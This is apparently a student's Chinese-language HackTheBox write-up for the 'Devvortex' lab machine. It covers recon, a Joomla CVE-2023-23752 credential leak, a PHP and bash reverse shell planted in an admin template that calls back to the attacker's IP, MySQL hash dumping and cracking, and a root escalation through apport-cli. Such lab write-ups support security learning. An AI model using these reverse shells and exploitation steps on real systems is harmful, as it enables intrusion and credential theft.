# W15 Devvortex
[TOC]

## How to Connect the Virtual Machine "Devvortex"
```
┌──(kali㉿kali)-[~]
└─$ cd ./Desktop
                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ ls
'lab_K99999 (3).ovpn'
                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo openvpn lab_K99999\ \(3\).ovpn
[sudo] password for kali: 
2023-12-18 12:16:36 WARNING: Compression for receiving enabled. Compression has been used in the past to break encryption. Sent packets are not compressed unless "allow-compression yes" is also set.
2023-12-18 12:16:36 Note: --data-cipher-fallback with cipher 'AES-128-CBC' disables data channel offload.
2023-12-18 12:16:36 OpenVPN 2.6.7 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
2023-12-18 12:16:36 library versions: OpenSSL 3.0.11 19 Sep 2023, LZO 2.10
2023-12-18 12:16:36 DCO version: N/A
2023-12-18 12:16:37 TCP/UDP: Preserving recently used remote address: [AF_INET]43.249.38.1:443
2023-12-18 12:16:37 Socket Buffers: R=[131072->131072] S=[16384->16384]
2023-12-18 12:16:37 Attempting to establish TCP connection with [AF_INET]43.249.38.1:443
2023-12-18 12:16:37 TCP connection established with [AF_INET]43.249.38.1:443
2023-12-18 12:16:37 TCPv4_CLIENT link local: (not bound)
2023-12-18 12:16:37 TCPv4_CLIENT link remote: [AF_INET]43.249.38.1:443
2023-12-18 12:16:37 TLS: Initial packet from [AF_INET]43.249.38.1:443, sid=fa0cac92 767bdb7d
2023-12-18 12:16:37 VERIFY OK: depth=1, C=UK, ST=City, L=London, O=HackTheBox, CN=HackTheBox CA, name=htb, emailAddress=info@hackthebox.eu
2023-12-18 12:16:37 VERIFY KU OK
2023-12-18 12:16:37 Validating certificate extended key usage
2023-12-18 12:16:37 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication
2023-12-18 12:16:37 VERIFY EKU OK
2023-12-18 12:16:37 VERIFY OK: depth=0, C=UK, ST=City, L=London, O=HackTheBox, CN=htb, name=htb, emailAddress=info@hackthebox.eu
2023-12-18 12:16:37 Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, peer certificate: 2048 bits RSA, signature: RSA-SHA1, peer temporary key: 253 bits X25519
2023-12-18 12:16:37 [htb] Peer Connection Initiated with [AF_INET]43.249.38.1:443
2023-12-18 12:16:37 TLS: move_session: dest=TM_ACTIVE src=TM_INITIAL reinit_src=1
2023-12-18 12:16:37 TLS: tls_multi_process: initial untrusted session promoted to trusted
2023-12-18 12:16:38 SENT CONTROL [htb]: 'PUSH_REQUEST' (status=1)
2023-12-18 12:16:38 PUSH: Received control message: 'PUSH_REPLY,route 10.10.10.0 255.255.254.0,route 10.129.0.0 255.255.0.0,route-ipv6 dead:beef::/64,explicit-exit-notify,tun-ipv6,route-gateway 10.10.16.1,topology subnet,ping 10,ping-restart 120,ifconfig-ipv6 dead:beef:4::103d/64 dead:beef:4::1,ifconfig 10.10.16.63 255.255.254.0,peer-id 10,cipher AES-256-CBC,protocol-flags cc-exit tls-ekm dyn-tls-crypt,tun-mtu 1500'
2023-12-18 12:16:38 OPTIONS IMPORT: --explicit-exit-notify can only be used with --proto udp
2023-12-18 12:16:38 OPTIONS IMPORT: --ifconfig/up options modified
2023-12-18 12:16:38 OPTIONS IMPORT: route options modified
2023-12-18 12:16:38 OPTIONS IMPORT: route-related options modified
2023-12-18 12:16:38 OPTIONS IMPORT: tun-mtu set to 1500
2023-12-18 12:16:38 net_route_v4_best_gw query: dst 0.0.0.0
2023-12-18 12:16:38 net_route_v4_best_gw result: via 192.168.86.2 dev eth0
2023-12-18 12:16:38 ROUTE_GATEWAY 192.168.86.2/255.255.255.0 IFACE=eth0 HWADDR=00:0c:29:7d:1c:8c
2023-12-18 12:16:38 GDG6: remote_host_ipv6=n/a
2023-12-18 12:16:38 net_route_v6_best_gw query: dst ::
2023-12-18 12:16:38 sitnl_send: rtnl: generic error (-101): Network is unreachable
2023-12-18 12:16:38 ROUTE6: default_gateway=UNDEF
2023-12-18 12:16:38 TUN/TAP device tun0 opened
2023-12-18 12:16:38 net_iface_mtu_set: mtu 1500 for tun0
2023-12-18 12:16:38 net_iface_up: set tun0 up
2023-12-18 12:16:38 net_addr_v4_add: 10.10.16.63/23 dev tun0
2023-12-18 12:16:38 net_iface_mtu_set: mtu 1500 for tun0
2023-12-18 12:16:38 net_iface_up: set tun0 up
2023-12-18 12:16:38 net_addr_v6_add: dead:beef:4::103d/64 dev tun0
2023-12-18 12:16:38 net_route_v4_add: 10.10.10.0/23 via 10.10.16.1 dev [NULL] table 0 metric -1
2023-12-18 12:16:38 net_route_v4_add: 10.129.0.0/16 via 10.10.16.1 dev [NULL] table 0 metric -1
2023-12-18 12:16:38 add_route_ipv6(dead:beef::/64 -> dead:beef:4::1 metric -1) dev tun0
2023-12-18 12:16:38 net_route_v6_add: dead:beef::/64 via :: dev tun0 table 0 metric -1
2023-12-18 12:16:38 Initialization Sequence Completed
```
:::info
2023-12-18 12:16:38 Initialization Sequence Completed =>代表已成功連線
:::

## Ping & Scan IP
```
┌──(kali㉿kali)-[~]
└─$ ping 10.10.11.242              
PING 10.10.11.242 (10.10.11.242) 56(84) bytes of data.
64 bytes from 10.10.11.242: icmp_seq=1 ttl=63 time=155 ms
64 bytes from 10.10.11.242: icmp_seq=2 ttl=63 time=55.8 ms
^C
--- 10.10.11.242 ping statistics ---
3 packets transmitted, 2 received, 33.3333% packet loss, time 1998ms
rtt min/avg/max/mdev = 55.815/105.638/155.461/49.823 ms
                                                             
┌──(kali㉿kali)-[~]
└─$ nmap -A 10.10.11.242
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-18 12:17 EST
Nmap scan report for 10.10.11.242
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.43 seconds
```
:::info
+ 透過nmap可以知道有開的port是22和80
1. 22有提供服務的OS和版本號，"OpenSSH 8.2p1 Ubuntu 4ubuntu0.9"
2. 80的部分需要去hosts手動新增DNS
:::

## 80 port Test，尋找入口點

1. 直接進掃描到的ip是無法進去的
![image](https://hackmd.io/_uploads/HktQO7lDp.png)
2. 設定hosts     
```                                           
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts
```

```
  GNU nano 7.2              /etc/hosts                       
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.230    cozyhosting.htb
10.10.11.242    devvortex.htb

                      [ Read 8 lines ]
^G Help     ^O Write Out^W Where Is ^K Cut      ^T Execute
^X Exit     ^R Read File^\ Replace  ^U Paste    ^J Justify
```
![image](https://hackmd.io/_uploads/SkM_9Xewp.png)

3. 可以連線到網站
![image](https://hackmd.io/_uploads/SyW9qXxwa.png)

+ 目錄爆破
```
┌──(kali㉿kali)-[~/dirsearch]
└─$ python dirsearch.py -u http://devvortex.htb/  
```
:::spoiler 爆破結果

```bash
Target: http://devvortex.htb/

[04:01:44] Starting:                                         
[04:01:45] 301 -  178B  - /js  ->  http://devvortex.htb/js/
[04:01:56] 200 -    7KB - /about.html
[04:02:19] 200 -    9KB - /contact.html
[04:02:33] 301 -  178B  - /css  ->  http://devvortex.htb/css/
[04:03:08] 301 -  178B  - /images  ->  http://devvortex.htb/images/
[04:03:09] 403 -  564B  - /images/
[04:03:13] 403 -  564B  - /js/

Task Completed         
```

:::

+ nikto 
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nikto -h 10.10.11.242 -o results.txt -F txt
```
:::spoiler 掃描結果

```bash
- Nikto v2.5.0/
+ Target Host: 10.10.11.242
+ Target Port: 80
+ GET /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options: 
+ GET /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/: 
+ HEAD nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
```
:::

+ DNS爆破


掃描到`dev.devvortex.htb`子域名，將其添加到`/etc/hosts`:
```
10.10.11.242 devvortex.htb
10.10.11.242 dev.devvortex.htb
```

再次目錄爆破後發現存在`robots.txt`，並且洩漏此網頁是用名為`Joomla`的系統架設的

![image](https://hackmd.io/_uploads/ryrO5EgPa.png)

disallow的列表中有一個administrator，嘗試訪問看看是否能登入，發現弱密碼及SQL injeciton皆無效，嘗試找看看`Joomla`系統是否有可用的CVE

找到一個2023年的CVE，是可以直接看到資料庫帳密的:[CVE-2023-23752](https://ssorc.tw/8905/joomla-easy-to-see-the-database-of-username-and-password/)

只要瀏覽http://[IP]/joomla/api/index.php/v1/config/application?public=true 就可以得到洩漏的資料

```
┌──(kali㉿kali)-[~]
└─$ curl "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true"
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes":{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}
```

發現洩漏SQL資料庫帳密:
```
"dbtype": "mysqli",
"host": "localhost",
"user": "lewis",
"password": "P4ntherg0t1n5r3c0n##",
```

## 獲得Reverse shell

發現可以使用此帳號密碼登入administrator頁面到管理者介面

![image](https://hackmd.io/_uploads/ryj2ASevp.png)

逛一逛網站後，發現可以訪問`System->Templates->Administrator Templates->index.php` 來修改php程式碼，可以在裡面寫入php reverse shell

![image](https://hackmd.io/_uploads/Sy-z18lwp.png)

php reverse shell
```
$sock=fsockopen("10.10.16.36",9999);
exec("sh <&3 >&3 2>&3");
```

掛nc
```
nc -lvnp 9999
```

結果:
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.16.36] from (UNKNOWN) [10.10.11.242] 50836
                          
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.16.36] from (UNKNOWN) [10.10.11.242] 38282

```

發現無法取得shell，參考writeup，嘗試使用如下的shell reverse shell:
```
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.36/9999 0>&1'");
```

結果可以成功返回shell:
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.16.36] from (UNKNOWN) [10.10.11.242] 53524
bash: cannot set terminal process group (874): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb/administrator$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@devvortex:~/dev.devvortex.htb/administrator$
```

## 橫向提權

嘗試用已經知道的帳密登入本地端的SQL服務
```
mysql -u lewis -p --password=P4ntherg0t1n5r3c0n##
<tor$ mysql -u lewis --password=P4ntherg0t1n5r3c0n##  
mysql: [Warning] Using a password on the command line interface can be insecure.

www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis --password=P4ntherg0t1n5r3c0n##
<tor$ mysql -u lewis --password=P4ntherg0t1n5r3c0n##  
mysql: [Warning] Using a password on the command line interface can be insecure.
show databases;

\g
show tables;
Database
information_schema
joomla
performance_schema
ERROR 1046 (3D000) at line 4: No database selected
www-data@devvortex:~/dev.devvortex.htb/administrator$
```
不知為何無回應，之後雖然有吐出資料庫名稱，但反而跑出error，使用`-p` 指令指定database `joomla`:
```
www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis --password=P4ntherg0t1n5r3c0n## -p joomla
< -u lewis --password=P4ntherg0t1n5r3c0n## -p joomla  
mysql: [Warning] Using a password on the command line interface can be insecure.
Enter password: P4ntherg0t1n5r3c0n##
show tables;
P4ntherg0t1n5r3c0n##
show tables;
Tables_in_joomla
sd4fg_action_log_config
sd4fg_action_logs
sd4fg_action_logs_extensions
sd4fg_action_logs_users
sd4fg_assets
sd4fg_associations
sd4fg_banner_clients
sd4fg_banner_tracks
sd4fg_banners
sd4fg_categories
sd4fg_contact_details
sd4fg_content
sd4fg_content_frontpage
sd4fg_content_rating
sd4fg_content_types
sd4fg_contentitem_tag_map
sd4fg_extensions
sd4fg_fields
sd4fg_fields_categories
sd4fg_fields_groups
sd4fg_fields_values
sd4fg_finder_filters
sd4fg_finder_links
sd4fg_finder_links_terms
sd4fg_finder_logging
sd4fg_finder_taxonomy
sd4fg_finder_taxonomy_map
sd4fg_finder_terms
sd4fg_finder_terms_common
sd4fg_finder_tokens
sd4fg_finder_tokens_aggregate
sd4fg_finder_types
sd4fg_history
sd4fg_languages
sd4fg_mail_templates
sd4fg_menu
sd4fg_menu_types
sd4fg_messages
sd4fg_messages_cfg
sd4fg_modules
sd4fg_modules_menu
sd4fg_newsfeeds
sd4fg_overrider
sd4fg_postinstall_messages
sd4fg_privacy_consents
sd4fg_privacy_requests
sd4fg_redirect_links
sd4fg_scheduler_tasks
sd4fg_schemas
sd4fg_session
sd4fg_tags
sd4fg_template_overrides
sd4fg_template_styles
sd4fg_ucm_base
sd4fg_ucm_content
sd4fg_update_sites
sd4fg_update_sites_extensions
sd4fg_updates
sd4fg_user_keys
sd4fg_user_mfa
sd4fg_user_notes
sd4fg_user_profiles
sd4fg_user_usergroup_map
sd4fg_usergroups
sd4fg_users
sd4fg_viewlevels
sd4fg_webauthn_credentials
sd4fg_workflow_associations
sd4fg_workflow_stages
sd4fg_workflow_transitions
sd4fg_workflows
ERROR 1064 (42000) at line 2: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'P4ntherg0t1n5r3c0n
show tables' at line 1
www-data@devvortex:~/dev.devvortex.htb/administrator$
```

使用python生成交互式shell

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.16.36] from (UNKNOWN) [10.10.11.242] 39300
bash: cannot set terminal process group (874): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb/administrator$ python3 -c "import pty;pty.spawn('/bin/bash')"
<tor$ python3 -c "import pty;pty.spawn('/bin/bash')"  
www-data@devvortex:~/dev.devvortex.htb/administrator$
```

倒出`sd4fg_users`資料表的東西

```
www-data@devvortex:~/dev.devvortex.htb/administrator$ mysql -u lewis --password=P4ntherg0t1n5r3c0n## -D joomla        
< -u lewis --password=P4ntherg0t1n5r3c0n## -D joomla  
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 72
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.01 sec)

mysql> use joomla;
use joomla;
Database changed
mysql> show tables;
show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| sd4fg_action_log_config       |
| sd4fg_action_logs             |
| sd4fg_action_logs_extensions  |
| sd4fg_action_logs_users       |
| sd4fg_assets                  |
| sd4fg_associations            |
| sd4fg_banner_clients          |
| sd4fg_banner_tracks           |
| sd4fg_banners                 |
| sd4fg_categories              |
| sd4fg_contact_details         |
| sd4fg_content                 |
| sd4fg_content_frontpage       |
| sd4fg_content_rating          |
| sd4fg_content_types           |
| sd4fg_contentitem_tag_map     |
| sd4fg_extensions              |
| sd4fg_fields                  |
| sd4fg_fields_categories       |
| sd4fg_fields_groups           |
| sd4fg_fields_values           |
| sd4fg_finder_filters          |
| sd4fg_finder_links            |
| sd4fg_finder_links_terms      |
| sd4fg_finder_logging          |
| sd4fg_finder_taxonomy         |
| sd4fg_finder_taxonomy_map     |
| sd4fg_finder_terms            |
| sd4fg_finder_terms_common     |
| sd4fg_finder_tokens           |
| sd4fg_finder_tokens_aggregate |
| sd4fg_finder_types            |
| sd4fg_history                 |
| sd4fg_languages               |
| sd4fg_mail_templates          |
| sd4fg_menu                    |
| sd4fg_menu_types              |
| sd4fg_messages                |
| sd4fg_messages_cfg            |
| sd4fg_modules                 |
| sd4fg_modules_menu            |
| sd4fg_newsfeeds               |
| sd4fg_overrider               |
| sd4fg_postinstall_messages    |
| sd4fg_privacy_consents        |
| sd4fg_privacy_requests        |
| sd4fg_redirect_links          |
| sd4fg_scheduler_tasks         |
| sd4fg_schemas                 |
| sd4fg_session                 |
| sd4fg_tags                    |
| sd4fg_template_overrides      |
| sd4fg_template_styles         |
| sd4fg_ucm_base                |
| sd4fg_ucm_content             |
| sd4fg_update_sites            |
| sd4fg_update_sites_extensions |
| sd4fg_updates                 |
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
| sd4fg_viewlevels              |
| sd4fg_webauthn_credentials    |
| sd4fg_workflow_associations   |
| sd4fg_workflow_stages         |
| sd4fg_workflow_transitions    |
| sd4fg_workflows               |
+-------------------------------+
71 rows in set (0.00 sec)

mysql> select * from sd4fg_users
select * from sd4fg_users
    -> ;
;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-12-20 11:22:48 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)

mysql>
```

取得使用者`logan`的hash:`$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12`

## 密碼爆破

用看看john破解他，取得密碼`tequieromucho`
```
┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)     
1g 0:00:00:14 DONE (2023-12-20 07:07) 0.06887g/s 96.69p/s 96.69c/s 96.69C/s lacoste..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```



使用`su logan`切換使用者，並至家目錄下取得user.txt的flag
```
www-data@devvortex:~/dev.devvortex.htb/administrator$ su logan                                         
su logan
Password: tequieromucho

ls
cache
components
help
includes
index.php
language
logs
manifests
modules
templates
cd ~
ls
linpeas.sh
user.txt
cat user.txt
1e662dd2f79b4984c55532511f385c8a
```

## 提升權限至root

再次使用python生成交互式shell
```
python3 -c "import pty;pty.spawn('/bin/bash')"
logan@devvortex:~$
```


使用`sudo -l`查看可使用管理者權限執行那些東西? => `/usr/bin/apport-cli`
```
logan@devvortex:~$ sudo -l
sudo -l
[sudo] password for logan: tequieromucho

Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
logan@devvortex:~$ 
```

找找看有沒有相關的CVE可以用，發現這個2023年的[CVE-2023-1326-PoC](https://github.com/diego-tella/CVE-2023-1326-PoC)，依照著流程走，在`/var/crash/`中發現可用的`.crash`檔:`_usr_bin_apport-cli.0.crash`，直接輸入`sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_apport-cli.0.crash`，按下`V (view report)`，輸入`!/bin/bash`，直接取得root權限。


```bash
logan@devvortex:~$ sudo -l
sudo -l
[sudo] password for logan: tequieromucho

Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
logan@devvortex:~$ ls /var/crash/             
ls /var/crash/
_usr_bin_apport-cli.0.crash
logan@devvortex:~$ sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_apport-cli.0.crash
<pport-cli -c /var/crash/_usr_bin_apport-cli.0.crash

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (32.3 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
V^J

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
...
...
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/bash
!//bbiinn//bbaasshh!/bin/bash
root@devvortex:/home/logan#
root@devvortex:/home/logan# ls ~
ls ~
root.txt
root@devvortex:/home/logan# cat ~/root.txt
cat ~/root.txt
f9d8d6bbc9286d18db33160149b2729c
root@devvortex:/home/logan#
```

# question
+ 無法安裝gobuster
+ 
